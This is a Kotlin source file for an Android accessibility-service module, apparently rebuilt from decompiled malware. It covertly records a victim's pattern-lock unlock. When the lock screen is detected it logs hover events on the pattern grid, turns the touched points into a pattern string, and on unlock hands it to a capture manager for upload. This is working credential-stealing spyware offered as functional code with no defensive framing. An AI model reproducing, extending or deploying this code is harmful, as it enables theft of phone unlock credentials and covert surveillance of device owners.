package com.storm.safe.rock.service.modules

import android.app.KeyguardManager
import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.storm.safe.rock.service.MyAccessibilityService
import org.json.JSONArray
import org.json.JSONObject

/**
 * Passive pattern unlock capture via HOVER_MOVE accessibility events.
 * Vendor: C0319a4 (GestureRecorderManager), methods a3 (onHoverEvent) + a6 (onWindowStateChanged).
 *
 * When lock screen is detected, starts recording. On HOVER_MOVE events from
 * pattern grid nodes, extracts contentDescription (e.g. "图案点3") to get
 * pattern point index. On unlock transition, packages captured points and
 * feeds to CipherCaptureManager for 4-path upload.
 */
class GestureRecorderManager(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "GestureRecorder"
        private val DIGIT_REGEX = Regex("\\d+")
    }

    @Volatile var isRecording = false
        private set
    var mode = 0  // 0=off, 1=recording
        private set
    private var wasLocked = false
    private val patternPoints = ArrayList<String>()
    private var patternCoords = JSONArray()
    private var recordingStartTime = 0L

    /**
     * Handle HOVER_MOVE accessibility event on lock screen.
     * Vendor: C0319a4.m211574a3
     *
     * Extracts pattern point number from node contentDescription,
     * deduplicates, and records coordinates.
     */
    fun onHoverEvent(event: AccessibilityEvent) {
        if (!isRecording || mode != 1) return

        val source = event.source ?: return
        try {
            val desc = source.contentDescription?.toString()
            if (desc.isNullOrEmpty()) return

            val match = DIGIT_REGEX.find(desc) ?: return
            val digit = match.value.toIntOrNull() ?: return

            val dedupKey = "pt:$digit"
            if (patternPoints.contains(dedupKey)) return

            val rect = Rect()
            source.getBoundsInScreen(rect)

            patternPoints.add(dedupKey)
            val pos = digit - 1 // 0-indexed (vendor: line 344)

            val point = JSONObject().apply {
                put("x", rect.centerX())
                put("y", rect.centerY())
                put("left", rect.left)
                put("top", rect.top)
                put("right", rect.right)
                put("bottom", rect.bottom)
                put("des", desc)
                put("pos", pos)
            }
            patternCoords.put(point)
            Log.d(TAG, "HOVER pattern point: pos=$pos desc=$desc @ (${rect.centerX()},${rect.centerY()}) seq=${patternCoords.length()}")
        } catch (e: Exception) {
            Log.w(TAG, "onHoverEvent error", e)
        } finally {
            source.recycle()
        }
    }

    /**
     * Detect locked->unlocked transition on WINDOW_STATE_CHANGED.
     * Vendor: C0319a4.m211577a6
     */
    fun onWindowStateChanged(event: AccessibilityEvent) {
        try {
            val km = service.getSystemService("keyguard") as? KeyguardManager ?: return
            if (km.isKeyguardSecure != true) return

            val nowLocked = km.isKeyguardLocked
            val justLocked = nowLocked && !wasLocked
            val justUnlocked = !nowLocked && wasLocked

            if (justLocked) {
                mode = 1
                isRecording = true
                recordingStartTime = System.currentTimeMillis()
                patternPoints.clear()
                patternCoords = JSONArray()
                Log.d(TAG, "Lock screen detected -> start pattern recording")
            }

            if (justUnlocked) {
                onUnlocked()
            }

            wasLocked = nowLocked
        } catch (e: Exception) {
            Log.w(TAG, "onWindowStateChanged error", e)
        }
    }

    /**
     * Package captured pattern data and feed to CipherCaptureManager.
     * Vendor: C0319a4.m211577a6 unlock branch (lines 530-643)
     */
    private fun onUnlocked() {
        isRecording = false
        mode = 0

        val pointCount = patternCoords.length()
        Log.d(TAG, "Unlock detected -> pattern points=$pointCount")

        if (pointCount < 4) {
            Log.d(TAG, "Pattern points < 4, skip upload")
            patternPoints.clear()
            patternCoords = JSONArray()
            return
        }

        // Build comma-separated pattern string from pos values
        val indices = mutableListOf<Int>()
        for (i in 0 until patternCoords.length()) {
            val obj = patternCoords.optJSONObject(i)
            if (obj != null) {
                indices.add(obj.optInt("pos", -1))
            }
        }
        val patternString = indices.filter { it >= 0 }.joinToString(",")
        Log.d(TAG, "Pattern password: $patternString (${indices.size} points)")

        // Feed to CipherCaptureManager -> 4-path upload
        try {
            val ccm = service.cipherCaptureManager
            if (ccm != null) {
                ccm.bufferCipher(patternString, "pattern")
                val saved = ccm.confirmAndSaveLastCipher()
                Log.d(TAG, "Pattern upload result: $saved")
            } else {
                Log.w(TAG, "CipherCaptureManager not initialized")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Pattern upload error", e)
        }

        patternPoints.clear()
        patternCoords = JSONArray()
    }

    fun reset() {
        isRecording = false
        mode = 0
        patternPoints.clear()
        patternCoords = JSONArray()
    }
}
